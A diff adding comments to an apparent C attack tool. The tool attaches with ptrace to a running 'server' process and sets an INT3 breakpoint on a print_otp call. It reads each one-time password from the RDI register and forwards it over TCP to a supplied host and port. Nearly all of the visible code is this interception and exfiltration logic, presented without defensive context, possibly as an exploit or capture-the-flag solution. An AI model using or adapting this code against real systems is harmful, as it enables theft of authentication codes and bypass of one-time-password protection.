@@ -34,6 +34,7 @@ static unsigned long read_maps_exe_base(pid_t pid) {
     char perms[8];
     if (sscanf(line, "%lx-%lx %7s", &s, &e, perms) != 3) continue;
     if (strncmp(perms, "r-xp", 4) != 0) continue;
+    // we only care about the server text mapping.
     if (!strstr(line, "/server")) continue;
     base = s;
     break;
@@ -80,6 +81,7 @@ static void poke_word(pid_t pid, uintptr_t aligned_addr, long w) {
 }
 
 static uint8_t read_byte(pid_t pid, uintptr_t addr) {
+  // ptrace peek/poke works in word-sized chunks, so we mask to aligned address first.
   uintptr_t a = addr & ~(uintptr_t)7;
   unsigned shift = (unsigned)((addr - a) * 8u);
   long w = peek_word(pid, a);
@@ -122,6 +124,7 @@ static void send_otp_tcp(const char *host, uint16_t port, uint32_t otp) {
   if (connect(fd, (struct sockaddr *)&a, sizeof a) == -1) die("connect");
 
   char buf[32];
+  // Client expects a 6-digit code and newline.
   int n = snprintf(buf, sizeof buf, "%06u\n", otp);
   if (n <= 0) {
     close(fd);
@@ -166,12 +169,14 @@ int main(int argc, char **argv) {
   fprintf(stderr, "[*] breakpoint VA = 0x%" PRIxPTR " (entry + %zu)\n", bp,
           (size_t)kHitInsideOffset);
 
+  // Attach to the already-running server process.
   if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) die("PTRACE_ATTACH");
 
   int status = 0;
   if (waitpid(pid, &status, 0) == -1) die("waitpid after attach");
 
   uint8_t saved = 0;
+  // Arm breakpoint once; then we keep re-arming it after each single-step.
   poke_int3(pid, bp, &saved);
 
   for (;;) {
@@ -195,6 +200,7 @@ int main(int argc, char **argv) {
     struct user_regs_struct regs;
     if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) die("PTRACE_GETREGS");
 
+    // print_otp(otp): first integer arg is in RDI on x86_64 SysV ABI.
     uint32_t otp = (uint32_t)(regs.rdi & 0xffffffffu);
     send_otp_tcp(host, port, otp);
 
@@ -209,6 +215,7 @@ int main(int argc, char **argv) {
 
     if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) die("PTRACE_SETREGS");
 
+    // Execute exactly one original instruction at bp before re-inserting INT3.
     if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1) die("PTRACE_SINGLESTEP");
     if (waitpid(pid, &status, 0) == -1) die("waitpid after step");
 
